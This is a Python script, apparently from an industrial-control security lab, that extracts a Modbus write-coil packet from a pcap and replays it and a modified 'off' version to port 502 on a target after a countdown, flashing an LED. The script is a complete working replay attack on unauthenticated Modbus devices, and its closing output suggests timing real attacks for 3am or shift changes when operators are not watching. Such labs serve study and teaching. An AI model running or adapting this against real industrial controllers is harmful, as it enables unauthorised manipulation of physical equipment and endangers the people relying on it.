#!/usr/bin/env python3
"""timing attack - delayed payload execution"""
import socket
import time
import sys
from datetime import datetime
from scapy.all import *
from scapy.layers.inet import IP, TCP

# path to pcap
pcap_path = "/Users/cj/Desktop/modbus_lab/cps-modbus-lab/cps-modbus-lab/pcap/one_write_coil_full.pcap"

# read pcap
try:
    packets = rdpcap(pcap_path)
    print(f"[+] successfully read {len(packets)} packets")
except Exception as e:
    print(f"[!] error reading pcap: {e}")
    sys.exit(1)

# find modbus on payload
led_on_payload = None
for i, pkt in enumerate(packets):
    # check for modbus query packets
    if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt[TCP].dport == 502:
        payload = bytes(pkt[Raw])
        if len(payload) >= 8: # valid modbus packet
            led_on_payload = payload
            print(f"[+] found modbus payload: {payload.hex()}")
            break

# verify payload found
if not led_on_payload:
    print("[!] no modbus query packet found")
    sys.exit(1)

# create off payload by modifying on payload
led_off_payload = bytearray(led_on_payload)
led_off_payload[-2:] = b'\x00\x00'  # change FF00 to 0000

# get target
target = sys.argv[1] if len(sys.argv) > 1 else "raspberrypi.local"

print("[*] timing attack - simulating delayed/scheduled attack")
print(f"[*] current time: {datetime.now()}")
print("[*] attack will trigger in 10 seconds...")

# countdown
for i in range(10, 0, -1):
    print(f"[*] {i}...", end="\r") # \r returns cursor to line start
    time.sleep(1)

# activate attack
print(f"\n[!] DELAYED ATTACK TRIGGERED at {datetime.now()}!")
print("[!] rapidly flashing LED to signal attack...")

# flash LED 10 times rapidly to show "attack triggered"
for i in range(10):
    # led on
    s = socket.socket()
    s.connect((target, 502))
    s.send(led_on_payload)
    s.close()
    print(f"[>] flash {i + 1}/10 - ON")
    time.sleep(0.2)

    # led off
    s = socket.socket()
    s.connect((target, 502))
    s.send(bytes(led_off_payload))
    s.close()
    print(f"[>] flash {i + 1}/10 - OFF")
    time.sleep(0.2)

# leave LED on at the end
s = socket.socket()
s.connect((target, 502))
s.send(led_on_payload)
s.close()

# information
print("\n[*] attack complete!")
print("[*] in a real attack, this could:")
print("    - wait for 3am when no operators are watching")
print("    - trigger during shift changes")
print("    - activate after detecting specific conditions")
print("    - coordinate with other malware")